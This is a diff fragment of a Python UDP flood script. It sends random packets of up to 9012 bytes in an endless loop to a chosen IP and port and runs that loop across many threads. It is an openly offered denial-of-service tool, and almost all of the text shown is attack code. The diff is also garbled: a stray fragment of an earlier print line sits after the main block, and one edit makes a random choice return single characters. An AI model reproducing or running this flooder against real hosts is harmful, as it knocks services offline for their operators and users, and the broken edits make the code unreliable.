@@ -108,13 +108,13 @@ def main():
             sys.exit(0)
 
     
-    data = random._urandom(2048)
-    i = random.choice(("\033[1;31m[*]\033[0m", "\033[1;31m[!]\033[0m", "\033[1;31m[#]\033[0m"))
+    data = random._urandom(9012)
+    i = random.choice(("[*], [#], [!]"))
     error_occurred = False
     
     try:
         while True:
-            print(i +"Sending UDP Packets para "f"\033[1;38;2;255;100;100m{ip}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
+            print(i +"Sending UDP Packets para "f"{ip}"":"f"{port}\033[1;37m""!")
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             addr = (str(ip), int(port))
             for x in range(times):
@@ -136,8 +136,8 @@ def main():
 
 if __name__ == "__main__":
     main()
-31m[!]\033[0m "f"\033[1;37m{e}\033[0m"".")
-                
+    
+    
     for y in range(threads):
         th = threading.Thread(target=run, args=(ip, port, times, threads))
         th.start()
